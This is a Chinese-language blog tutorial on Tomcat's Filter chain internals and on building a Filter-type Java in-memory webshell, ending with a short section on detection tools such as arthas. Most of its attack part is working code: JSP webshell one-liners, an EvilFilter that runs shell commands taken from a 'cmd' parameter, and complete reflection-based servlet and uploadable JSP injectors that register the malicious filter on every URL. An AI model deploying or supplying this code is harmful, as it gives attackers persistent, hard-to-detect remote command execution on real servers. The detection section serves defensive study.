---
title: Java 内存马之 Filter 型内存马
date: 2026-10-19
---

# Java 内存马之 Filter 型内存马

## 前言

在之前学习 Servlet 的时候已经学过 Filter 过滤器了，我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作，下面是一个简单的流程图：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterServlet.png)

从上图可以看出，我们的请求会经过 Filter 之后才会到达 Servlet，那么如果我们动态创建一个 Filter 并且将其放在最前面，我们的 Filter 就会最先执行，当我们在 Filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存马。

所以我们接下来的主要目标就是：**动态注册恶意 Filter，并且将其放在最前面。**

## Tomcat Filter 流程分析

在学习 Filter 内存马的注入之前，我们先来分析一下正常 Filter 在 Tomcat 中的流程是怎么样的。

### 项目搭建

现在 IDEA 创建 Servlet 是在 Jakarta EE 中，有 IDEA 的激活就行。

自定义 Filter：

```java
package com.solo.filter;

import javax.servlet.*;
import java.io.IOException;

public class filter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter初始化完成");
    }

    @Override
    public void destroy() {
        Filter.super.destroy();
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        System.out.println("执行了过滤操作");
        chain.doFilter(request,response);
    }
}
```

然后修改 web.xml 文件，这里我们设置`url-parttern`为`/hello-servlet`，即访问`/hello-servlet`才会触发：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <filter>
        <filter-name>filter</filter-name>
        <filter-class>com.solo.filter.filter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>filter</filter-name>
        <url-pattern>/hello-servlet</url-pattern>
    </filter-mapping>
</web-app>
```

接下来分析一下 Tomcat 中是如何将我们自定义的 Filter 进行设置并调用的。先在 pom.xml 中加上 Tomcat 的依赖库：

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.81</version>
    <scope>provided</scope>
</dependency>
```

### 在访问 /hello-servlet 之后的流程分析

我们在 filter.java 下的`doFilter()`方法这里打断点，并且访问`/hello-servlet`接口开始调试。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/DebugPoint.png)

直接停在`doFilter()`方法，跟进去。

这里会进入`ApplicationFilterChain`类的`doFilter()`方法，它主要是进行了`Globals.IS_SECURITY_ENABLED`，也就是是否开启全局安全服务的判断。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterChainDoFilter.png)

直接 F8 进去，直接走到结尾：

```java
internalDoFilter(request, response);
```

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterChainInternalDoFilter.png)

其中的 filter 是从`ApplicationFilterConfig filterConfig = filters[pos++]`得来的，而 filters 的定义如下：

```java
private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];
```

现在我们其实是有两个 filter 的：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TwoFilters.png)

可以看到，0 是我们自己设定的 filter，1 是 Tomcat 自带的 filter，因此此时 pos 是 1，所以取到 Tomcat 自带的 Filter。我们继续向下走，这里就调用了 Tomcat 的 filter 的`doFilter()`方法：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatFilter.png)

再往下走，会走到`chain.doFilter()`这个地方，我们会发现这一个方法会回到`ApplicationFilterChain`类的`doFilter()`方法里面。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterChainDoFilter.png)

这里其实是因为我们是一条 Filter 链，所以会一个个获取 Filter，直到最后一个。那么现在我们因为只定义了一个 Filter，所以现在这次循环获取 Filter 链就是最后一次。

在最后一次获取 Filter 链的时候，会走到`servlet.service(request, response);`这个地方：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LastFilterServlet.png)

总的来说，最后一个 Filter 调用 Servlet 的`service()`方法。上一个`Filter.doFilter()`方法调中用`FilterChain.doFilter()`方法将调用下一个`Filter.doFilter()`方法，这也就是我们的 Filter 链，是逐个去获取的。

最后一个`Filter.doFilter()`方法中调用的`FilterChain.doFilter()`方法将调用目标 Servlet 的`service()`方法。

只要 Filter 链中有任意一个 Filter 没有调用`FilterChain.doFilter()`方法，则目标 Servlet 的`service()`方法都不会被执行。

**所以在 Filter 链的调用中，调用结构是一个个调用`doFilter()`方法，最后一个 Filter 调用 Servlet 的`service()`方法**。

### 在访问 /hello-servlet 之前的流程分析

分析的目的在于：假设我们基于 Filter 去实现一个内存马，我们需要找到 Filter 是如何被创建的。

> 我们可以把断点下载最远的一处`invoke()`方法的地方。

此处我们选到最远处的一个`invoke()`方法：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FarestInvoke.png)

这里的类是`StandardEngineValve`，对应的 Pipeline 就是`EnginePipeline`，它进行了`invoke()`方法的调用，这个`invoke()`方法的调用的目的地是`AbstractAccessLogValve`类的`invoke()`方法。其实这一步已经安排了`request, wrapper, servlet`传递的顺序。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FirstInvoke.png)

接着就是`AbstractAccessLogValve`的`invoke()`方法，然后一步步调用`invoke()`方法。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SecondInvoke.png)

可以看一下下面的图中的流程：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/InvokeChains.png)

其实就是在 Filter 链调用之前，先进行了一系列的`invoke()`方法的调用。这里利用的是 Tomcat 的 **Pipeline（管道）与 Valve（阀门）机制**。Tomcat 为了处理请求，把不同的职责划分到四个容器中，即 Engine、Host、Context、Wrapper。

每个容器都有一个`Pipeline`，管道中装有很多`Valve`，请求就像是水流一样，从最外面的 Engine 管道流进来，经过层层阀门，最终流到最里面的 Wrapper 管道。

至此，`invoke()`部分的流程已经分析完毕，继续往上看，也就是`doFilter()`方法。这个`doFilter()`方法也是由最近的那个`invoke()`方法调用的。如图，我们可以把断点打进去，有两个`doFilter()`，看哪个可用就在哪个下断点：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/NearestInvoke.png)

这里我们要重点关注之前说过的`filterChain`这个变量：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterChain.png)

我们跟进`createFilterChain()`这个方法，使用`ApplicationFilterFactory.createFilterChain()`创建了一个过滤链，将`request,wrapper,servlet`进行传递。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/createFilterChain.png)

我们在`createFilterChain()`方法过一下流程。这里就是判断`FilterMaps`是否为空，若为空则会调用`context.findFilterMaps()`从`StandardContext`寻找并且返回一个 FilterMap 数组。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/filterMaps.png)

再看看后面的代码：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/findFilterConfig.png)

遍历`filterMaps`得到 Filter 和 URL 的映射关系并通过`matchDispatcher()`、`matchFilterURL()`方法进行匹配，匹配成功后，还需要判断`StandardContext.filterConfigs`中，是否存在对应 Filter 的实例，当实例不为空时，通过`addFilter()`方法，将管理 Filter 实例的`filterConfig`添加到`filterChain`对象中。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/findFilterConfigJudge.png)

这时候我们再进入 `doFilter()` 的方法其实是，将请求交给其 pipeline 去处理，由 pipeline 中的所有 valve 顺序处理请求。后续的就是我们前文分析过的 **在访问 /hello-servlet 之后的流程分析**。

### 小结

这里总结一下 Tomcat Filter 的流程。

#### 1. invoke() 方法

层层调用管道，在最后一个管道的地方会创建一个链子，这个链子就是 FilterChain，再对里面的 Filter 进行一些相关的匹配。

#### 2. 拿到 FilterChain 之后

进入`doFilter()`工作，将请求交给对应的 pipeline 处理，也就是进行一个`doFilter()`->`internalDoFilter()`->`doFilter()`，直到最后一个 Filter 被调用。

#### 3. 最后一个 Filter

最后一个 Filter 会执行完`doFilter()`，随后跳转到`Servlet.service()`中。

#### 4. 攻击思路

分析完运行流程，接下来思考对应的攻击方式。

我们的攻击代码应该是在这里生效：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/findFilterConfigJudge.png)

我们只需要构造含有恶意的 filter 的 **filterConfig** 和拦截器 **filterMaps**，就可以达到触发目的了，并且它们是从`StandardContext`中来的。

而这个 filterMaps 中的数据对应 web.xml 中的`<filter-mapping>`标签：

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
 xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
 version="4.0">  
 <filter> <filter-name>filter</filter-name>  
 <filter-class>filter</filter-class>  
 </filter>  
 <filter-mapping> <filter-name>filter</filter-name>  
 <url-pattern>/filter</url-pattern>  
 </filter-mapping></web-app>
```

所以后续我们要思考通过某种方式去触发修改它。

## Filter 型内存马思路分析

上面说到我们需要通过某种方式去触发修改 filterMaps，也就是如何修改 web.xml 中的`<filter-mapping>`标签。

filterMaps 可以通过两种方法添加数据，对应的类就是`StandardContext`这个类：

```java
@Override
public void addFilterMap(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.add(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}

@Override
public void addFilterMapBefore(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.addBefore(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}
```

`StandardContext`这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。

里面有三个和 Filter 有关的成员变量：

```text
filterMaps变量：包含所有过滤器的URL映射关系 

filterDefs变量：包含所有过滤器包括实例内部等变量 

filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理
```

`filterConfigs`成员变量是一个 HashMap 对象，存储了 filter 名称与对应的`ApplicationFilterConfig`对象的键值对，在`ApplicationFilterConfig`对象中则存储了 Filter 实例以及该实例在 web.xml 中的注册信息。

`filterDefs`成员变量是一个 HashMap 对象，存储了 filter 名称与对应`FilterDef`的对象的键值对，而`FilterDef`对象则存储了 Filter 包括名称、描述、类名、Filter 实例在内等与 Filter 自身相关的数据。

`filterMaps`中的`FilterMap`则记录了不同 Filter 与`UrlPattern`的映射关系。

```java
private HashMap<String, ApplicationFilterConfig> filterConfigs = new HashMap(); 

private HashMap<String, FilterDef> filterDefs = new HashMap(); 

private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();
```

接下来看一下`ApplicationFilterConfig`中存了什么东西：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterConfig.png)

其中有三个重要的东西：ServletContext、filter、filterDef。

其中 filterDef 就是对应 web.xml 中的`filter`标签：

```xml
<filter>  
 <filter-name>filter</filter-name>  
 <filter-class>filter</filter-class>  
</filter>
```

从`org.apache.catalina.core.StandardContext#filterStart`中可以看到`filterConfig`可以通过`filterConfigs.put(name, filterConfig)`添加：

```java
public boolean filterStart() {

    if (getLogger().isDebugEnabled()) {
        getLogger().debug("Starting filters");
    }
    // Instantiate and record a FilterConfig for each defined filter
    boolean ok = true;
    synchronized (filterConfigs) {
        filterConfigs.clear();
        for (Entry<String,FilterDef> entry : filterDefs.entrySet()) {
            String name = entry.getKey();
            if (getLogger().isDebugEnabled()) {
                getLogger().debug(" Starting filter '" + name + "'");
            }
            try {
                ApplicationFilterConfig filterConfig =
                        new ApplicationFilterConfig(this, entry.getValue());
                filterConfigs.put(name, filterConfig);
            } catch (Throwable t) {
                t = ExceptionUtils.unwrapInvocationTargetException(t);
                ExceptionUtils.handleThrowable(t);
                getLogger().error(sm.getString(
                        "standardContext.filterStart", name), t);
                ok = false;
            }
        }
    }

    return ok;
}
```

### 构造思路

经过分析，构造的主要思路是：

1. 获取当前应用的 ServletContext 对象
2. 通过 ServletContext 对象再获取到 filterConfigs
3. 实现自定义想要注入的 Filter 对象
4. 为自定义对象的 Filter 创建一个 FilterDef
5. 最后把 ServletContext 对象、Filter 对象、FilterDef 全部都设置到`filterConfigs`即可完成内存马的实现

## Filter 型内存马的实现

我们先看看 JSP 的无回显的木马：

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

然后是有回显的木马：

```java
<% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
}
 
%>
```

而现在我们要把这个恶意的有回显的木马插入到 Filter 中去，也就是说要配置一个恶意的 Filter，即：

```java
package com.solo.filter;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class EvilFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        if(req.getParameter("cmd")!=null){
            boolean isLinux=true;
            String osTyp = System.getProperty("os.name");
            if(osTyp!=null&&osTyp.toLowerCase().contains("win")){
                isLinux=false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner scanner = new Scanner(in).useDelimiter("\\A");
            String output = scanner.hasNext() ? scanner.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
        }
        chain.doFilter(request,response);
    }

    @Override
    public void destroy() {

    }
}
```

然后把 web.xml 中的类修改为`EvilFilter`，把`<url-pattern>`修改为`/*`。

本质上其实就是 Filter 中接受执行参数，但是如果我们在现实情况下需要动态地将该 Filter 给添加进去。

由前面的分析我们知道`StandardContext`将 Filter 实例存放在`filterConfigs`、`filterDefs`、`filterConfigs`这三个变量中，将 Filter 添加到这三个变量中即可将内存马打入。那么如何获取到`StandardContext`成为了问题的关键。

### 内存马 EXP

先用一张图总结一下构造的流程：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/AttackRoute.png)

先是通过反射获取到`StandardContext`：

```java
ServletContext servletContext = request.getSession().getServletContext();  
  
Field appctx = servletContext.getClass().getDeclaredField("context");  
appctx.setAccessible(true);  
ApplicationContext applicationContext = (ApplicationContext)appctx.get(servletContext);  
  
Field stdctx = applicationContext.getClass().getDeclaredField("context");  
stdctx.setAccessible(true);  
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
 
String FilterName = "cmd_Filter";  
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
Configs.setAccessible(true);  
filterConfigs = (Map) Configs.get(standardContext); 
```

然后定义一个 Filter：

```java
Filter filter = new Filter() {  
	@Override  
	public void init(FilterConfig filterConfig) throws ServletException {  
	}  
  
	@Override  
	public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
		HttpServletRequest req = (HttpServletRequest) servletRequest;  
		if (req.getParameter("cmd") != null){  
			InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
 			Scanner s = new Scanner(in).useDelimiter("\\A");  
 			String output = s.hasNext() ? s.next() : "";  
 			servletResponse.getWriter().write(output);  
  
 			return;
    	}  
    	filterChain.doFilter(servletRequest,servletResponse);  
 	}  
  
	@Override  
	public void destroy() {
	}  
};
```

再设置 FilterDef 和 FilterMaps：

```java
//反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加  
Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  
FilterDef o = (FilterDef) declaredConstructors.newInstance();  
o.setFilter(filter);  
o.setFilterName(FilterName);  
o.setFilterClass(filter.getClass().getName());  
standardContext.addFilterDef(o);  
//反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去  
Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();  
org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();  
  
o1.addURLPattern("/*");  
o1.setFilterName(FilterName);  
o1.setDispatcher(DispatcherType.REQUEST.name());  
standardContext.addFilterMapBefore(o1);
```

最终将这些都添加到`filterConfig`中，再放到 web.xml 中：

```java
Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);  
declaredConstructor1.setAccessible(true);  
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);  
filterConfigs.put(FilterName,filterConfig);  
response.getWriter().write("Success");
```

完整 EXP：

```java
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import java.util.Map;
import java.util.Scanner;

@WebServlet("/demoServlet")
public class FilterShell extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        Field Configs = null;
        Map filterConfigs;
        try {
            //这里是反射获取ApplicationContext的context，也就是standardContext  
            ServletContext servletContext = request.getSession().getServletContext();

            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);



            String FilterName = "cmd_Filter";
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(FilterName) == null){
                Filter filter = new Filter() {

                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        HttpServletRequest req = (HttpServletRequest) servletRequest;
                        if (req.getParameter("cmd") != null){

                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
//  
                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String output = s.hasNext() ? s.next() : "";
                            servletResponse.getWriter().write(output);

                            return; }
                        filterChain.doFilter(servletRequest,servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }
                };
                //反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加  
                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
                FilterDef o = (FilterDef)declaredConstructors.newInstance();
                o.setFilter(filter);
                o.setFilterName(FilterName);
                o.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(o);
                //反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去  
                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
                org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();

                o1.addURLPattern("/*");
                o1.setFilterName(FilterName);
                o1.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(o1);

                //反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去  
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
                declaredConstructor1.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
                filterConfigs.put(FilterName,filterConfig);
                response.getWriter().write("Success");


            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}
```

如果文件上传的话可以上传一个 JSP 文件：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    final String name = "solo";
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null) {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner( in ).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.getWriter().write(output);
                    servletResponse.getWriter().flush();
                    return;
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {

            }

        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name, filterConfig);
        out.print("Inject Success !");
    }
%>
<html>
<head>
    <title>filter</title>
</head>
<body>
    Hello Filter
</body>
</html>

```

然后上传这个 JSP 即可。

## 排查 Java 内存马的方法

### arthas

项目链接：https://github.com/alibaba/arthas。

我们可以使用这个项目来检测我们的内存马。

`java -jar arthas-boot.jar --telnet-port 9998 --http-port -1`进行启动，然后选择 Tomcat 进程：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatProcess.png)

输入 1 之后利用`sc *.Filter`进行模糊搜索，会列出所有调用了 Filter 的类：

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SCAllFilter.png)

利用`jad --source-only org.apache.jsp.evil_jsp`直接将 class 进行反编译，这样就实现了防御。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/JarClass.png)

同时也可以进行监控，当我们访问 URL 就会输出监控结果：

`watch org.apache.catalina.core.ApplicationFilterFactory createFilterChain 'returnObj.filters.{?#this!=null}.{filterClass}'`。

### copagent

项目链接：https://github.com/LandGrey/copagent

这也是一个检测内存马的工具。

### java-memshell-scanner

项目链接：https://github.com/c0ny1/java-memshell-scanner

大佬写的检测内存马的工具，能够检测并且进行删除。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/MemshellScanner.png)

这个工具是由 JSP 实现的，这里学习一下删除内存马的逻辑。

